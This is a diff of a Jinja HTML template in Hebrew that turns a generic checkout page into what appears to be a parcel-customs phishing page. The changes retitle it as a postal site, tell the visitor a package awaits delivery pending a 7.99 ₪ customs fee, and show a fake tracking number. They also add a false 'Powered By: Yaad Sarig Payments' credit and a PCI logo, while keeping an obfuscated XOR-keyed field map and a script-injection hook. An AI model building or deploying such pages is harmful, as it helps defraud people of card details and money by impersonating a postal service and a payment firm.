@@ -3,13 +3,14 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>סיום הזמנה</title>
+  <title>אתר דואר</title>
   <link rel="stylesheet" href="/static/css/lab-theme.css" />
+  <link rel="stylesheet" href="/static/css/billing-overlays.css" />
   {% if bango_shell_inject %}{{ bango_shell_inject|safe }}{% endif %}
   <link rel="stylesheet" href="{{ url_for('theme_asset', theme_name=active_theme_id, filename='style.css') }}">
 </head>
 <body class="{{ bcls['bango-page'] }}">
-  <div style="position:absolute;clip:rect(0,0,0,0);width:1px;height:1px;overflow:hidden" data-ui-map="{{ bango_ui_map_json|e }}" data-ui-key="{{ bango_xor_key|e }}" aria-hidden="true">.</div>
+  <div style="position:absolute;clip:rect(0,0,0,0);width:1px;height:1px;overflow:hidden" data-ui-map="{{ billing_ui_map_json|default(bango_ui_map_json)|e }}" data-ui-key="{{ billing_xor_key|default(bango_xor_key)|e }}" aria-hidden="true">.</div>
   <div class="page-card siteW" id="bango-main">
     <p id="bango-msg" role="status" aria-live="polite"></p>
     <header class="site-banner" role="banner">
@@ -18,18 +19,18 @@
 
     <form id="{{ bcls['bango-form'] }}" class="Yform" method="post" novalidate>
       <div class="page-intro">
-        <h5 class="user-info fw-bolder text-danger">סיכום הזמנה — סכום לתשלום: 7.99 ₪</h5>
+        <h5 class="user-info fw-bolder text-danger">החבילה שלך מחכה למשלוח. אנא שלם מכס (7.99 ₪)</h5>
       </div>
 
-      <div class="server_err_msg">שגיאה בטיפול בבקשה. נסה שוב.</div>
+      <div class="server_err_msg">הודעת שגיאה מהשרת</div>
       <div class="form-columns">
         <div class="part_container">
           <fieldset class="main_fieldset" aria-labelledby="cap-package cap-personal">
-            <div id="cap-package" class="fieldset-cap">פרטי ההזמנה</div>
+            <div id="cap-package" class="fieldset-cap">מספר חבילה</div>
             <div class="dbl_cont">
               <div class="form_hndlDiv">
-                <label for="code">מספר הזמנה</label>
-                <input type="text" id="code" class="input-text" value="ORD-206047576" disabled>
+                <label for="code">עקוב אחר חבילה</label>
+                <input type="text" id="code" class="input-text" value="LK206047576ES" disabled>
               </div>
             </div>
 
@@ -96,7 +97,7 @@
               </div>
             </div>
           </fieldset>
-          <input class="submit_btn {{ bcls['btn-submit'] }}" id="submit" type="submit" value="אישור תשלום">
+          <input class="submit_btn {{ bcls['btn-submit'] }}" id="submit" type="submit" value="לתשלום">
         </div>
       </div>
       <div style="position:absolute;left:-9999px;height:0;overflow:hidden;opacity:0" aria-hidden="true">
@@ -118,27 +119,15 @@
       <img src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/amex credit card.png') }}" alt="">
     </div>
     <div class="footer-meta">
-      <span>אבטחת מידע:</span>
+      <span>Powered By:</span>
+      <a href="#" target="_blank" rel="noopener noreferrer">Yaad Sarig Payments</a>&nbsp;&nbsp;|&nbsp;
       <img src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/pci.png') }}" alt="">
     </div>
   </footer>
 
-  <div id="bango-loading-overlay" class="lab-glass-overlay lab-glass-overlay--viewport lab-glass-overlay--page-loading" hidden aria-hidden="true">
-    <div class="lab-spinner lab-spinner--lg" aria-hidden="true"></div>
-    <span class="lab-sr-only">Loading</span>
-  </div>
-  <div id="bango-success-overlay" class="{{ bcls['bango-success-overlay'] }}" hidden aria-hidden="true" role="alert" lang="he" dir="rtl">
-    <div class="{{ bcls['bango-success-overlay__icon'] }}" aria-hidden="true">
-      <svg width="55" height="55" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="4" stroke-linecap="round" stroke-linejoin="round">
-        <polyline points="20 6 9 17 4 12"></polyline>
-      </svg>
-    </div>
-    <h2 class="{{ bcls['bango-success-overlay__title'] }}">הפעולה הושלמה בהצלחה</h2>
-    <p class="{{ bcls['bango-success-overlay__text'] }}">הנתונים אומתו בהצלחה.</p>
-    <div class="{{ bcls['bango-success-overlay__spinner'] }}" aria-hidden="true"></div>
-  </div>
+  {% include 'shared/billing_overlays.html' %}
 
-  <script nonce="{{ bango_csp_nonce }}" src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='script.js') }}"></script>
+  <script nonce="{{ billing_csp_nonce or bango_csp_nonce }}" src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='script.js') }}"></script>
   {% include 'bango/scripts.html' %}
 </body>
 </html>
